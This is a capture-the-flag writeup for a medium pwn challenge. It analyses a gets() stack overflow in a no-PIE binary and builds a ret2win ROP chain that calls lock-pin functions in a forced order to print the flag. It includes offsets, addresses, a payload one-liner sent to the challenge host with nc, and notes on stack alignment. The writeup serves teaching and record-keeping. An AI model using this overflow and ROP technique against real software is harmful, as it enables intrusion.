<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=CADEADO" alt="Typing SVG" /></a>

</div>

# Cadeado — PWN · 🟡 MEDIUM

- **Status:** ✅ SOLVED by the team — a teammate landed it on remote and submitted the flag (14/11 12:09). This writeup documents our analysis and the chain that works locally; the remote run of this exact chain stalled at the win function (stack alignment, see below).
- **Points:** 323 (final dynamic value)
- **Flag:** `IDP{...}` (submitted by a teammate, not recorded here)
- **Attachment / Target:** `pwn` (ELF 64-bit, x86-64, dynamically linked, **not stripped**) / `pwn.<DOMAIN>:9605`
- **Prompt:** *"Vai destravando.."* — remote prompt: `Vai despinando:`

---

## TL;DR

1. `entrada()` reads into a 64-byte stack buffer with **`gets()`** → unbounded stack overflow. No canary, **No PIE** → fixed addresses, ret2win.
2. The win function `verificar_cadeado()` runs `system("cat flag.txt")` only if the 5 globals `pino1..pino5` are all set. Each `pino_N()` refuses (calls `pulou_pino()` → `exit`) unless its predecessor is already set, which **forces a call order**. `pino_2()` is also the one that builds the `"cat flag.txt"` string.
3. Overflow → ROP chain that calls the pins **in the forced order**, then `verificar_cadeado`: `pino_3 → pino_5 → pino_4 → pino_1 → pino_2 → verificar_cadeado`.

## Analysis

### Protections (checksec)
```
Arch:    amd64-64-little
RELRO:   Partial
Stack:   No canary found
NX:      enabled        (irrelevant — ret2win, no shellcode)
PIE:     No PIE (0x400000)   -> addresses are fixed
Stripped: No            -> symbols present (pino_1..pino_5, verificar_cadeado)
```

### The overflow — `entrada()` @ 0x401374
```
sub rsp,0x40            ; buffer at rbp-0x40  (64 bytes)
lea rax,[rbp-0x40]
call gets@plt          ; <-- unbounded read, classic bof
leave ; ret
```
Offset to saved RIP = **64 (buffer) + 8 (saved rbp) = 72**.

### The win — `verificar_cadeado()` @ 0x4013b7
Checks `pino1,pino2,pino3,pino4,pino5` (globals at 0x40409c..0x4040ac). If **all non-zero**:
```
puts("[+] Cadeado aberto.")
system(comando)        ; comando @ 0x404060
exit(0)
```
`comando` is **empty/garbage by default** — it only becomes `"cat flag.txt"` after `pino_2()` runs (it copies the string from `comando_certo` @ 0x402008). So we *must* route through `pino_2`.

### The pins — forced ordering (each guards on its predecessor)
| func | addr | sets | requires (else `pulou_pino`→exit) |
|---|---|---|---|
| `pino_3` | `0x401268` | pino3 | — (free entry point) |
| `pino_5` | `0x40128c` | pino5 | pino3 |
| `pino_4` | `0x4012bf` | pino4 | pino5 |
| `pino_1` | `0x4012f2` | pino1 | pino4 |
| `pino_2` | `0x401325` | pino2 + **sets `comando`** | pino1 |

Only valid order: **3 → 5 → 4 → 1 → 2**, then `verificar_cadeado`. The theme "despinando / pinos fora do lugar" = put the pins in order.

### Exploit payload
```
"A"*72 | p64(pino_3) p64(pino_5) p64(pino_4) p64(pino_1) p64(pino_2) p64(verificar_cadeado)
```
Addresses: `0x401268 0x40128c 0x4012bf 0x4012f2 0x401325 0x4013b7`.

**Local result (proven):** with a dummy `flag.txt` in the cwd, the chain prints all 5 pins in order, `[+] Cadeado aberto.`, then the flag file content. Stack is already 16-aligned at `system()` locally → **no extra `ret` needed** (adding one `ret` desyncs alignment and the flag disappears).

## What didn't work (remote)

| Attempt | Result | Note |
|---|---|---|
| Chain `3,5,4,1,2,verificar` (no align `ret`) — works 100% local | Remote prints the 5 `Pino N ajustado.` then **stops** — no `Cadeado aberto.`, no flag | Reaches `pino_2`, but the win function produces no output |
| Same chain + keep-alive (`sleep`/hold socket open) | Same (only up to Pino 2) | Not a premature-EOF/buffering cut |

**Interpretation:** this is the classic **`movaps` / stack-alignment crash inside `system()`** on remote (the `system` in glibc does a 16-byte-aligned xmm store; if RSP%16 != 0 at the call, it SIGSEGVs). The remote environment has the opposite alignment parity from the local test, so the chain that is aligned locally is misaligned remotely → `system` crashes before producing output (and with buffered stdout the `Cadeado aberto.` line is lost with it).

## Fixing the remote run (alignment)

The chain is correct; on remote it only needs an alignment nudge. The variants to try, in order, watching for `Cadeado aberto.` + the flag:

**1) Add ONE `ret` gadget (`0x40101a`) right before `verificar_cadeado`** (shifts RSP by 8):
```bash
{ python3 -c 'import sys;from struct import pack;sys.stdout.buffer.write(b"A"*72+b"".join(pack("<Q",a) for a in (0x401268,0x40128c,0x4012bf,0x4012f2,0x401325,0x40101a,0x4013b7))+b"\n")'; sleep 3; } | nc pwn.<DOMAIN> 9605
```

**2) If that still stops at Pino 2**, sweep the alignment / padding parity:
- try **two** `ret`s (`...,0x401325,0x40101a,0x40101a,0x4013b7`)
- try padding **71** or **73** instead of 72 (in case remote stack/offset differs by a byte)

**3) Robust runner** (`solve.py` in this folder) — uses pwntools `interactive()`, easier to read the flag. On Arch, pip is externally-managed, so use a venv:
```bash
python3 -m venv ~/.venvs/pwn && ~/.venvs/pwn/bin/pip install pwntools
~/.venvs/pwn/bin/python solve.py remote      # edit the chain to add the align ret if needed
```
`solve.py` also runs locally (no arg) against `./dist/pwn` — drop a dummy `flag.txt` in the cwd to verify end-to-end before firing at remote.

**4) If none of the alignment variants work**, the remote binary may differ from the handout — re-dump the win path (`verificar_cadeado`/`system`) and re-confirm addresses.

---

## Appendix — tools

- `solve.py` — `python3 solve.py [remote]`: builds the 72-byte padding + ordered pin ROP chain; no arg = local `./dist/pwn`, `remote` = `pwn.<DOMAIN>:9605`.
- Pure-stdlib one-liner (no pwntools): see "Hand-off" above.
- Recon: `objdump -d -M intel pwn`, `nm -C pwn`, `checksec`, `ROPgadget --binary pwn` (ret gadget `0x40101a`).
